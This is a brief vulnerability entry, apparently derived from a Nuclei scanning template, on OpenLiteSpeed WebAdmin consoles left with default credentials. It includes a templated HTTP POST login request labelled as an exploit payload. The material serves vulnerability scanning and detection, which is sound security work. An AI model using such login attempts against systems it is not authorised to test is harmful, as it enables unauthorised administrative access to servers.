# Vulnerability: OpenLiteSpeed WebAdmin - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`openlitespeed-default-login.yaml`)

## Description
Detected OpenLiteSpeed WebAdmin Console was using default credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userid={{username}}&pass={{password}}
```

